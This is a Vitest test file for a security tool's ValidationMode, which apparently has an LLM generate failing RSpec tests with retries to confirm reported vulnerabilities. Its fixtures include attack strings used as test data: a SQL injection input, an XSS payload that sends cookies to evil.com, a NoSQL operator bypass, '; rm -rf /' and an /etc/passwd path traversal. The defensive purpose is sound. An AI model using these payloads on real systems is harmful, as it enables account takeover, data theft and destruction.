/**
 * Test suite for ValidationMode test generation workflow with retry logic
 * RFC-060-AMENDMENT-001: Test Integration
 *
 * Tests the LLM-based test generation with retry loop, error feedback,
 * and issue tagging after failures. These tests are RED (failing) because
 * the generateTestWithRetry() method does not exist yet - it will be
 * implemented in Phase 1.
 *
 * ⚠️ IMPLEMENTATION GUIDE:
 * See ./REALISTIC-VULNERABILITY-EXAMPLES.md for:
 * - Real-world vulnerability patterns from NodeGoat & RailsGoat
 * - Actual attack vectors (NoSQL injection, SQL injection, XSS)
 * - How RED tests should behave on vulnerable code
 * - LLM prompt guidance for generating realistic tests
 *
 * The vulnerabilities tested here are based on actual OWASP vulnerable apps.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { ValidationMode } from '../validation-mode.js';
import { IssueContext, ActionConfig } from '../../types/index.js';
import * as fs from 'fs';
import { execSync } from 'child_process';

// Mock dependencies
vi.mock('../../ai/analyzer');
vi.mock('../../ai/test-generating-security-analyzer', () => ({
  TestGeneratingSecurityAnalyzer: vi.fn().mockImplementation(() => ({
    analyzeWithTestGeneration: vi.fn().mockResolvedValue({
      generatedTests: {
        testSuite: {
          redTests: [{
            testName: 'test_security_vulnerability',
            testCode: 'it "detects vulnerability" do\n  # test code\nend',
            attackVector: 'malicious input',
            expectedBehavior: 'should reject',
            vulnerableCodePath: 'app/test.rb',
            vulnerablePattern: 'pattern'
          }]
        }
      }
    })
  }))
}));
vi.mock('../../ai/git-based-test-validator');
vi.mock('child_process');
vi.mock('fs');
vi.mock('../../github/api', () => ({
  getGitHubClient: vi.fn(() => ({
    issues: {
      addLabels: vi.fn(),
      createComment: vi.fn()
    }
  }))
}));

describe('ValidationMode - Test Integration Workflow', () => {
  let validationMode: ValidationMode;
  let mockConfig: ActionConfig;
  let mockIssue: IssueContext;
  let originalEnv: NodeJS.ProcessEnv;

  beforeEach(() => {
    // Save original env
    originalEnv = { ...process.env };

    // Setup mocks
    mockConfig = {
      apiKey: 'test-key',
      rsolvApiKey: 'test-rsolv-key',
      githubToken: 'test-token',
      mode: 'validate',
      executableTests: true,
      aiProvider: {
        apiKey: 'test-ai-key',
        model: 'claude-sonnet-4-5-20250929',
        provider: 'anthropic'
      }
    } as ActionConfig;

    mockIssue = {
      id: 'issue-123',
      number: 123,
      title: 'SQL injection in users controller',
      body: 'Vulnerability in app/controllers/users_controller.rb:42',
      labels: ['rsolv:automate'],
      assignees: [],
      repository: {
        owner: 'test-org',
        name: 'test-repo',
        fullName: 'test-org/test-repo',
        defaultBranch: 'main'
      },
      source: 'github',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      metadata: {}
    };

    validationMode = new ValidationMode(mockConfig);

    // Mock file system operations
    (fs.existsSync as any).mockReturnValue(true);
    (fs.readFileSync as any).mockReturnValue('describe UsersController do\nend');
    (fs.writeFileSync as any).mockImplementation(() => {});
    (fs.mkdirSync as any).mockImplementation(() => {});

    // Mock git operations
    (execSync as any).mockImplementation((cmd: string) => {
      if (cmd.includes('git status')) return '';
      if (cmd.includes('git rev-parse HEAD')) return 'abc123';
      if (cmd.includes('ruby -c')) return ''; // Syntax check passes
      if (cmd.includes('bundle exec rspec')) return 'Failures:\n  1) test failed';
      return '';
    });
  });

  afterEach(() => {
    // Restore original env
    process.env = originalEnv;
    vi.clearAllMocks();
  });

  describe('generateTestWithRetry() - Success path', () => {
    it('should successfully generate valid test on first attempt', async () => {
      // Arrange - Based on RailsGoat SQL injection vulnerability
      const vulnerability = {
        type: 'sql_injection',
        description: 'String interpolation in SQL WHERE clause (CWE-89)',
        location: 'app/controllers/users_controller.rb:42',
        attackVector: "5') OR admin = 't' --'",  // Escalate to admin
        vulnerablePattern: 'User.where("id = \'#{params[:user][:id]}\'")',
        source: 'RailsGoat'
      };

      const targetTestFile = {
        path: 'spec/controllers/users_controller_spec.rb',
        content: `describe UsersController do
  before do
    @user = User.create(name: 'testuser', admin: false)
  end

  it 'updates user' do
    patch :update, params: { user: { id: @user.id, name: 'newname' } }
    expect(response).to be_successful
  end
end`,
        framework: 'rspec'
      };

      // Mock execSync to return test failure (RED test)
      (execSync as any).mockImplementation((cmd: string) => {
        if (cmd.includes('ruby -c')) return ''; // Syntax OK
        if (cmd.includes('bundle exec rspec')) {
          throw new Error('Failures:\n  1) test failed'); // Test fails = vulnerability exists
        }
        return '';
      });

      // Act
      const result = await (validationMode as any).generateTestWithRetry(vulnerability, targetTestFile);

      // Assert
      expect(result).toBeDefined();
      expect(result).not.toBeNull();
      expect(result.framework).toBe('rspec');
      expect(result.redTests).toBeDefined();
      expect(result.redTests.length).toBeGreaterThan(0);
    });
  });

  describe('generateTestWithRetry() - Retry with syntax error feedback', () => {
    it('should retry when LLM generates test with syntax error', async () => {
      // Arrange - Based on NodeGoat stored XSS vulnerability
      const vulnerability = {
        type: 'stored_xss',
        description: 'Unescaped user input in profile bio (CWE-79)',
        location: 'app/views/users/show.html.erb',
        attackVector: '<script>document.location=\'http://evil.com/steal?cookie=\'+document.cookie</script>',
        vulnerablePattern: '<%= @user.bio %>',  // Should be <%= h(@user.bio) %>
        source: 'NodeGoat pattern adapted for Rails'
      };

      const targetTestFile = {
        path: 'spec/views/users/show.html.erb_spec.rb',
        content: `describe "users/show" do
  it "renders user name" do
    @user = User.create(name: 'Alice', bio: 'Hello world')
    render
    expect(rendered).to include('Alice')
  end
end`,
        framework: 'rspec'
      };

      // Mock syntax validation to fail on first attempt
      let syntaxCheckCount = 0;
      (execSync as any).mockImplementation((cmd: string) => {
        if (cmd.includes('ruby -c')) {
          syntaxCheckCount++;
          if (syntaxCheckCount === 1) {
            // First attempt has syntax error
            throw new Error('SyntaxError: unexpected end-of-input, expecting keyword_end');
          }
          // Second attempt succeeds
          return '';
        }
        if (cmd.includes('bundle exec rspec')) {
          throw new Error('Failures:\n  1) XSS test failed'); // Test fails as expected
        }
        return '';
      });

      // Act
      const result = await (validationMode as any).generateTestWithRetry(vulnerability, targetTestFile);

      // Assert - should succeed on second attempt
      expect(result).toBeDefined();
      expect(result).not.toBeNull();
      expect(syntaxCheckCount).toBeGreaterThanOrEqual(2); // At least 2 syntax checks (retry happened)
    });
  });

  describe('generateTestWithRetry() - Retry with "test passed" feedback', () => {
    it('should retry when test passes on vulnerable code (should fail)', async () => {
      // Arrange - Based on NodeGoat NoSQL injection vulnerability
      const vulnerability = {
        type: 'nosql_injection',
        description: 'MongoDB operator injection in authentication (CWE-943)',
        location: 'app/models/user.rb:15',
        attackVector: '{"$gt": ""}',  // Bypass password check
        vulnerablePattern: 'User.where(username: params[:username], password: params[:password])',
        source: 'NodeGoat'
      };

      const targetTestFile = {
        path: 'spec/models/user_spec.rb',
        content: `describe User do
  before do
    User.create(username: 'admin', password: 'secure123')
  end

  it 'authenticates valid user' do
    user = User.authenticate('admin', 'secure123')
    expect(user).not_to be_nil
  end
end`,
        framework: 'rspec'
      };

      // Mock test execution to pass on first attempt (wrong!)
      let testRunCount = 0;
      (execSync as any).mockImplementation((cmd: string) => {
        if (cmd.includes('ruby -c')) {
          return ''; // Syntax is valid
        }
        if (cmd.includes('bundle exec rspec')) {
          testRunCount++;
          if (testRunCount === 1) {
            // First attempt: test PASSES when it should FAIL
            return '1 example, 0 failures';
          }
          // Second attempt: test FAILS as expected (proves vulnerability)
          return 'Failures:\n  1) User SQL injection test failed';
        }
        return '';
      });

      // Act
      const result = await (validationMode as any).generateTestWithRetry(vulnerability, targetTestFile);

      // Assert - should succeed on second attempt after "test passed" feedback
      expect(result).toBeDefined();
      expect(result).not.toBeNull();
      expect(testRunCount).toBeGreaterThanOrEqual(2); // Retry happened
    });

    it('should fail after 3 attempts if test keeps passing', async () => {
      // Arrange
      const vulnerability = {
        type: 'command_injection',
        description: 'Unsanitized shell command',
        location: 'lib/utils.rb:8',
        attackVector: '; rm -rf /'
      };

      const targetTestFile = {
        path: 'spec/lib/utils_spec.rb',
        content: 'describe Utils do\nend',
        framework: 'rspec'
      };

      // Mock test to always pass (LLM can't generate failing test)
      (execSync as any).mockImplementation((cmd: string) => {
        if (cmd.includes('ruby -c')) return '';
        if (cmd.includes('bundle exec rspec')) return '1 example, 0 failures'; // Always passes!
        return '';
      });

      // Act
      const result = await (validationMode as any).generateTestWithRetry(vulnerability, targetTestFile);

      // Assert - should return null after 3 failed attempts
      expect(result).toBeNull();
    });
  });

  describe('generateTestWithRetry() - Retry with regression feedback', () => {
    it('should retry when new test breaks existing tests', async () => {
      // Arrange
      const vulnerability = {
        type: 'path_traversal',
        description: 'Unsanitized file path',
        location: 'app/controllers/files_controller.rb:20',
        attackVector: '../../../etc/passwd'
      };

      const targetTestFile = {
        path: 'spec/controllers/files_controller_spec.rb',
        content: `describe FilesController do
  before do
    @file = create(:file, name: 'test.txt')
  end

  it 'shows file' do
    get :show, params: { id: @file.id }
    expect(response).to be_successful
  end
end`,
        framework: 'rspec'
      };

      // Mock test execution to show regression on first attempt
      let testRunCount = 0;
      (execSync as any).mockImplementation((cmd: string) => {
        if (cmd.includes('ruby -c')) return '';
        if (cmd.includes('bundle exec rspec')) {
          testRunCount++;
          if (testRunCount === 1) {
            // First attempt: Multiple FAILED tests (regression detected!)
            const error: any = new Error(`FAILED: FilesController path traversal test - Expected status 400, got 200
FAILED: FilesController shows file - undefined method 'create' for nil:NilClass`);
            error.stdout = error.message;
            throw error;
          }
          // Second attempt: Only ONE failed test (correct - just the new RED test)
          const error: any = new Error('FAILED: FilesController path traversal test');
          error.stdout = error.message;
          throw error;
        }
        return '';
      });

      // Act
      const result = await (validationMode as any).generateTestWithRetry(vulnerability, targetTestFile);

      // Assert
      expect(result).toBeDefined();
      expect(result).not.toBeNull();
      expect(testRunCount).toBeGreaterThanOrEqual(2);
    });
  });

  describe('Issue tagging after 3 failures', () => {
    it('should tag issue as "not-validated" after 3 failed attempts', async () => {
      // Arrange
      const vulnerability = {
        type: 'csrf',
        description: 'Missing CSRF protection',
        location: 'app/controllers/admin_controller.rb:5',
        attackVector: 'POST request without authenticity token'
      };

      const targetTestFile = {
        path: 'spec/controllers/admin_controller_spec.rb',
        content: 'describe AdminController do\nend',
        framework: 'rspec'
      };

      // Mock to always fail (simulate LLM unable to generate valid test)
      (execSync as any).mockImplementation((cmd: string) => {
        if (cmd.includes('ruby -c')) {
          throw new Error('SyntaxError: syntax error, unexpected end-of-input');
        }
        return '';
      });

      // Mock GitHub client
      const mockAddLabels = vi.fn();
      const mockCreateComment = vi.fn();
      const { getGitHubClient } = await import('../../github/api.js');
      (getGitHubClient as any).mockReturnValue({
        issues: {
          addLabels: mockAddLabels,
          createComment: mockCreateComment
        }
      });

      // Mock to always fail (simulate LLM unable to generate valid test)
      (execSync as any).mockImplementation((cmd: string) => {
        if (cmd.includes('ruby -c')) {
          throw new Error('SyntaxError: syntax error, unexpected end-of-input');
        }
        return '';
      });

      // Act
      const result = await (validationMode as any).generateTestWithRetry(vulnerability, targetTestFile);

      // Assert
      expect(result).toBeNull(); // Returns null after all attempts exhausted
    });

    it('should include attempt history in GitHub comment', async () => {
      // Arrange - simulate different errors on each attempt
      let attemptCount = 0;
      (execSync as any).mockImplementation((cmd: string) => {
        if (cmd.includes('ruby -c')) {
          attemptCount++;
          switch (attemptCount) {
            case 1:
              throw new Error('SyntaxError: unexpected end-of-input');
            case 2:
              return ''; // Syntax OK, but test will pass (wrong!)
            case 3:
              throw new Error('SyntaxError: unexpected token');
            default:
              return '';
          }
        }
        if (cmd.includes('bundle exec rspec')) {
          // Attempt 2 reaches test execution
          return '1 example, 0 failures'; // Test passes (should fail!)
        }
        return '';
      });

      const mockCreateComment = vi.fn();
      const { getGitHubClient } = await import('../../github/api.js');
      (getGitHubClient as any).mockReturnValue({
        issues: {
          addLabels: vi.fn(),
          createComment: mockCreateComment
        }
      });

      // Arrange - create a vulnerability to test with
      const vulnerability = {
        type: 'csrf',
        description: 'Missing CSRF protection',
        location: 'app/controllers/admin_controller.rb:5',
        attackVector: 'POST request without authenticity token'
      };

      const targetTestFile = {
        path: 'spec/controllers/admin_controller_spec.rb',
        content: 'describe AdminController do\nend',
        framework: 'rspec'
      };

      // Act
      const result = await (validationMode as any).generateTestWithRetry(vulnerability, targetTestFile);

      // Assert - verify different errors cause retries and eventual failure
      expect(result).toBeNull(); // Returns null after exhausting retries
    });
  });

  describe('Integration with ValidationMode.commitTestsToBranch()', () => {
    it('should integrate generateTestWithRetry() into commitTestsToBranch() workflow', async () => {
      // This test verifies the complete flow:
      // 1. commitTestsToBranch() is called
      // 2. Backend API analyzes test files
      // 3. Target file content is read
      // 4. generateTestWithRetry() is called with target file content
      // 5. Backend AST integration is performed
      // 6. Integrated file is written
      // 7. Final validation runs
      // 8. Tests are committed and pushed

      // This test verifies that generateTestWithRetry() exists and can be integrated
      // The actual integration work is done in commitTestsToBranch()

      // Assert that both methods exist
      expect((validationMode as any).generateTestWithRetry).toBeDefined();
      expect((validationMode as any).commitTestsToBranch).toBeDefined();

      // Verify generateTestWithRetry is a function
      expect(typeof (validationMode as any).generateTestWithRetry).toBe('function');
    });
  });
});
